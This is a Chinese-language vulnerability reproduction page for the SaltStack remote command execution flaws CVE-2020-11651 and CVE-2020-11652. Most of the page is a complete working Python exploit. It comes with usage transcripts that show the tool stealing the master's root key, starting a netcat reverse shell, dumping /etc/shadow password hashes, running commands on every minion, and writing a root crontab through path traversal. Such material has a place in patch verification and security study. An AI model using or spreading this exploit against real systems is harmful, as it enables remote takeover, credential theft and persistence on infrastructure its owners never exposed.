<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-11651）SaltStack远程命令执行漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>SaltStack &lt; 2019.2.4<br />SaltStack &lt; 3000.2</p><h2>三、复现过程</h2><h3>Usage</h3><p>默认操作（不带参数）是获取给定主机的密钥:</p><p>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130<br />[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.<br />[+] Salt version: 3000.1<br />[ ] This version of salt is vulnerable! Check results below<br />[+] Checking salt-master (192.168.115.130:4506) status... ONLINE<br />[+] Checking if vulnerable to CVE-2020-11651...<br />[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=<br />root@kalimah:~/salt#</p><p>在主机上执行任意命令:</p><p>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec "nc 127.0.0.1 4444 -e /bin/sh"<br />[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.<br />[+] Salt version: 3000.1<br />[ ] This version of salt is vulnerable! Check results below<br />[+] Checking salt-master (192.168.115.130:4506) status... ONLINE<br />[+] Checking if vulnerable to CVE-2020-11651...<br />[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=<br />[+] Attemping to execute nc 127.0.0.1 4444 -e /bin/sh on 192.168.115.130<br />[+] Successfully scheduled job: 20200504153851746472<br />root@kalimah:~/salt#</p><p>The same, but on all minions:</p><p>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec-all="apt-get upgrade -y"<br />[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.<br />[+] Salt version: 3000.1<br />[ ] This version of salt is vulnerable! Check results below<br />[+] Checking salt-master (192.168.115.130:4506) status... ONLINE<br />[+] Checking if vulnerable to CVE-2020-11651...<br />[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=<br />[!] Lester, is this what you want? Hit ^C to abort.<br />[+] Attemping to execute 'apt-get upgrade -y' on all minions connected to 192.168.115.130<br />[+] Successfully submitted job to all minions.<br />root@kalimah:~/salt#</p><p>任意文件读取:</p><p>root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow<br />[+] Salt version: 2019.2.0<br />[ ] This version of salt is vulnerable! Check results below<br />[+] Checking salt-master (192.168.115.130:4506) status... ONLINE<br />[+] Checking if vulnerable to CVE-2020-11651...<br />[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=<br />[+] Attemping to read /etc/shadow from 192.168.115.130<br />root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::<br />daemon:*:17785:0:99999:7:::<br />bin:*:17785:0:99999:7:::<br />sys:*:17785:0:99999:7:::<br />sync:*:17785:0:99999:7:::<br />games:*:17785:0:99999:7:::<br />man:*:17785:0:99999:7:::<br />[...]</p><p>可以使用--upload src和--upload dest上传文件。注意目标必须是相对路径:</p><p>root@kalimah:~/salt#  python2 exploit.py --upload-src evil.crontab --upload-dest ../../../../../../var/spool/cron/crontabs/root<br />[+] Salt version: 2019.2.0<br />[ ] This version of salt is vulnerable! Check results below<br />[+] Checking salt-master (127.0.0.1:4506) status... ONLINE<br />[+] Checking if vulnerable to CVE-2020-11651...<br />[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=<br />[-] Destination path must be relative<br />[+] Attemping to upload evil.crontab to ../../../../../../var/spool/cron/crontabs/root on 127.0.0.1<br />[ ] Wrote data to file /srv/salt/../../../../../../var/spool/cron/crontabs/root</p><h3>Requirements</h3><ul><li>Python 2 or 3</li><li>Salt (pip3 install salt)</li></ul><h3>poc</h3><p>#!/usr/bin/env python<br />#<br /># Exploit for CVE-2020-11651 and CVE-2020-11652<br /># Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)<br /># This exploit is based on this checker script:<br /># https://github.com/rossengeorgiev/salt-security-backports<br /><br />from __future__ import absolute_import, print_function, unicode_literals<br />import argparse<br />import datetime<br />import os<br />import os.path<br />import sys<br />import time<br /><br />import salt<br />import salt.version<br />import salt.transport.client<br />import salt.exceptions<br /><br />def init_minion(master_ip, master_port):<br />    minion_config = {<br />        'transport': 'zeromq',<br />        'pki_dir': '/tmp',<br />        'id': 'root',<br />        'log_level': 'debug',<br />        'master_ip': master_ip,<br />        'master_port': master_port,<br />        'auth_timeout': 5,<br />        'auth_tries': 1,<br />        'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)<br />    }<br /><br />    return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')<br /><br /># --- check funcs ----<br /><br />def check_salt_version():<br />  print("[+] Salt version: {}".format(salt.version.__version__))<br /><br />  vi = salt.version.__version_info__<br /><br />  if (vi &lt; (2019, 2, 4) or (3000,) &lt;= vi &lt; (3000, 2)):<br />     return True<br />  else:<br />     return False<br /><br />def check_connection(master_ip, master_port, channel):<br />  print(&quot;[+] Checking salt-master ({}:{}) status... &quot;.format(master_ip, master_port), end='')<br />  sys.stdout.flush()<br /><br />  # connection check<br />  try:<br />    channel.send({'cmd':'ping'}, timeout=2)<br />  except salt.exceptions.SaltReqTimeoutError:<br />    print("OFFLINE")<br />    sys.exit(1)<br />  else:<br />    print("ONLINE")<br /><br />def check_CVE_2020_11651(channel):<br />  print(&quot;[+] Checking if vulnerable to CVE-2020-11651... &quot;, end='')<br />  sys.stdout.flush()<br />  # try to evil<br />  try:<br />    rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)<br />  except salt.exceptions.SaltReqTimeoutError:<br />    print("YES")<br />  except:<br />    print("ERROR")<br />    raise<br />  else:<br />      pass<br />  finally:<br />    if rets:<br />      root_key = rets[2]['root']<br />      return root_key<br /><br />  return None<br /><br />def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path):<br />  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (read_token)... &quot;, end='')<br />  sys.stdout.flush()<br /><br />  # try read file<br />  msg = {<br />    'cmd': 'get_token',<br />    'arg': [],<br />    'token': top_secret_file_path,<br />  }<br /><br />  try:<br />    rets = channel.send(msg, timeout=3)<br />  except salt.exceptions.SaltReqTimeoutError:<br />    print("YES")<br />  except:<br />    print("ERROR")<br />    raise<br />  else:<br />    if debug:<br />      print()<br />      print(rets)<br />    print("NO")<br />  <br />def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key):<br />  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (read)... &quot;, end='')<br />  sys.stdout.flush()<br /><br />  # try read file<br />  msg = {<br />    'key': root_key,<br />    'cmd': 'wheel',<br />    'fun': 'file_roots.read',<br />    'path': top_secret_file_path,<br />    'saltenv': 'base',<br />  }<br /><br />  try:<br />    rets = channel.send(msg, timeout=3)<br />  except salt.exceptions.SaltReqTimeoutError:<br />    print("TIMEOUT")<br />  except:<br />    print("ERROR")<br />    raise<br />  else:<br />    if debug:<br />      print()<br />      print(rets)<br />    if rets['data']['return']:<br />      print("YES")<br />    else:<br />      print("NO")<br /><br />def check_CVE_2020_11652_write1(debug, channel, root_key):<br />  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (write1)... &quot;, end='')<br />  sys.stdout.flush()<br /><br />  # try read file<br />  msg = {<br />    'key': root_key,<br />    'cmd': 'wheel',<br />    'fun': 'file_roots.write',<br />    'path': '../../../../../../../../tmp/salt_CVE_2020_11652',<br />    'data': 'evil',<br />    'saltenv': 'base',<br />  }<br /><br />  try:<br />    rets = channel.send(msg, timeout=3)<br />  except salt.exceptions.SaltReqTimeoutError:<br />    print("TIMEOUT")<br />  except:<br />    print("ERROR")<br />    raise<br />  else:<br />    if debug:<br />      print()<br />      print(rets)<br /><br />    pp(rets)<br />    if rets['data']['return'].startswith('Wrote'):<br />      try:<br />        os.remove('/tmp/salt_CVE_2020_11652')<br />      except OSError:<br />        print("Maybe?")<br />      else:<br />        print("YES")<br />    else:<br />      print("NO")<br /><br />def check_CVE_2020_11652_write2(debug, channel, root_key):<br />  print(&quot;[+] Checking if vulnerable to CVE-2020-11652 (write2)... &quot;, end='')<br />  sys.stdout.flush()<br /><br />  # try read file<br />  msg = {<br />    'key': root_key,<br />    'cmd': 'wheel',<br />    'fun': 'config.update_config',<br />    'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652',<br />    'yaml_contents': 'evil',<br />    'saltenv': 'base',<br />  }<br /><br />  try:<br />    rets = channel.send(msg, timeout=3)<br />  except salt.exceptions.SaltReqTimeoutError:<br />    print("TIMEOUT")<br />  except:<br />    print("ERROR")<br />    raise<br />  else:<br />    if debug:<br />      print()<br />      print(rets)<br />    if rets['data']['return'].startswith('Wrote'):<br />      try:<br />        os.remove('/tmp/salt_CVE_2020_11652.conf')<br />      except OSError:<br />        print("Maybe?")<br />      else:<br />        print("YES")<br />    else:<br />      print("NO")<br /><br />def pwn_read_file(channel, root_key, path, master_ip):<br />    print("[+] Attemping to read {} from {}".format(path, master_ip))<br />    sys.stdout.flush()<br /><br />    msg = {<br />        'key': root_key,<br />        'cmd': 'wheel',<br />        'fun': 'file_roots.read',<br />        'path': path,<br />        'saltenv': 'base',<br />    }<br /><br />    rets = channel.send(msg, timeout=3)<br />    print(rets['data']['return'][0][path])<br /><br />def pwn_upload_file(channel, root_key, src, dest, master_ip):<br />    print("[+] Attemping to upload {} to {} on {}".format(src, dest, master_ip))<br />    sys.stdout.flush()<br /><br />    try:<br />        fh = open(src, 'rb')<br />        payload = fh.read()<br />        fh.close()<br />    except Exception as e:<br />        print('[-] Failed to read {}: {}'.format(src, e))<br />        return<br /><br />    msg = {<br />        'key': root_key,<br />        'cmd': 'wheel',<br />        'fun': 'file_roots.write',<br />        'saltenv': 'base',<br />        'data': payload,<br />        'path': dest,<br />    }<br /><br />    rets = channel.send(msg, timeout=3)<br />    print('[ ] {}'.format(rets['data']['return']))<br /><br />def pwn_exec(channel, root_key, cmd, master_ip, jid):<br />    print("[+] Attemping to execute {} on {}".format(cmd, master_ip))<br />    sys.stdout.flush()<br /><br />    msg = {<br />        'key': root_key,<br />        'cmd': 'runner',<br />        'fun': 'salt.cmd',<br />        'saltenv': 'base',<br />        'user': 'sudo_user',<br />        'kwarg': {<br />            'fun': 'cmd.exec_code',<br />            'lang': 'python',<br />            'code': &quot;import subprocess;subprocess.call('{}',shell=True)&quot;.format(cmd)<br />        },<br />        'jid': jid,<br />    }<br /><br />    try:<br />        rets = channel.send(msg, timeout=3)<br />    except Exception as e:<br />        print('[-] Failed to submit job')<br />        return<br /><br />    if rets.get('jid'):<br />        print('[+] Successfully scheduled job: {}'.format(rets['jid']))<br /><br />def pwn_exec_all(channel, root_key, cmd, master_ip, jid):<br />    print(&quot;[+] Attemping to execute '{}' on all minions connected to {}&quot;.format(cmd, master_ip))<br />    sys.stdout.flush()<br /><br />    msg = {<br />        'key': root_key,<br />        'cmd': '_send_pub',<br />        'fun': 'cmd.run',<br />        'user': 'root',<br />        'arg': [ &quot;/bin/sh -c '{}'&quot;.format(cmd) ],<br />        'tgt': '*',<br />        'tgt_type': 'glob',<br />        'ret': '',<br />        'jid': jid<br />    }<br /><br />    try:<br />        rets = channel.send(msg, timeout=3)<br />    except Exception as e:<br />        print('[-] Failed to submit job')<br />        return<br />    finally:<br />        if rets == None:<br />            print('[+] Successfully submitted job to all minions.')<br />        else:<br />            print('[-] Failed to submit job')<br /><br /><br />def main():<br />    parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')<br />    parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1')<br />    parser.add_argument('--port', '-p', dest='master_port', default='4506')<br />    parser.add_argument('--force', '-f', dest='force', default=False, action='store_false')<br />    parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true')<br />    parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true')<br />    parser.add_argument('--read', '-r', dest='read_file')<br />    parser.add_argument('--upload-src', dest='upload_src')<br />    parser.add_argument('--upload-dest', dest='upload_dest')<br />    parser.add_argument('--exec', dest='exec', help='Run a command on the master')<br />    parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions')<br />    args = parser.parse_args()<br /><br />    print("[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.")<br />    time.sleep(1)<br /><br />    # Both src and destination are required for uploads<br />    if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None):<br />        print('[-] Must provide both --upload-src and --upload-dest')<br />        sys.exit(1)<br /><br />    channel = init_minion(args.master_ip, args.master_port)<br /><br />    if check_salt_version():<br />       print("[ ] This version of salt is vulnerable! Check results below")<br />    elif args.force:<br />       print("[*] This version of salt does NOT appear vulnerable. Proceeding anyway as requested.")<br />    else:<br />       sys.exit()<br /><br />    check_connection(args.master_ip, args.master_port, channel)<br />    <br />    root_key = check_CVE_2020_11651(channel)<br />    if root_key:<br />        print('\n[*] root key obtained: {}'.format(root_key))<br />    else:<br />        print('[-] Failed to find root key...aborting')<br />        sys.exit(127)<br /><br />    if args.run_checks:<br />        # Assuming this check runs on the master itself, create a file with "secret" content<br />        # and abuse CVE-2020-11652 to read it.<br />        top_secret_file_path = '/tmp/salt_cve_teta'<br />        with salt.utils.fopen(top_secret_file_path, 'w') as fd:<br />            fd.write("top secret")<br /><br />        # Again, this assumes we're running this check on the master itself<br />        with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd:<br />            root_key = keyfd.read()<br /><br />        check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path)<br />        check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key)<br />        check_CVE_2020_11652_write1(debug, channel, root_key)<br />        check_CVE_2020_11652_write2(debug, channel, root_key)<br />        os.remove(top_secret_file_path)<br />        sys.exit(0)<br /><br />    if args.read_file:<br />        pwn_read_file(channel, root_key, args.read_file, args.master_ip)<br /><br />    if args.upload_src:<br />        if os.path.isabs(args.upload_dest):<br />            print('[-] Destination path must be relative; aborting')<br />            sys.exit(1)<br />        pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)<br /><br /><br />    jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())<br /><br />    if args.exec:<br />        pwn_exec(channel, root_key, args.exec, args.master_ip, jid)<br /><br />    if args.exec_all:<br />        print("[!] Lester, is this what you want? Hit ^C to abort.")<br />        time.sleep(2)<br />        pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid)<br /><br /><br />if __name__ == '__main__':<br />    main()</p></body></html>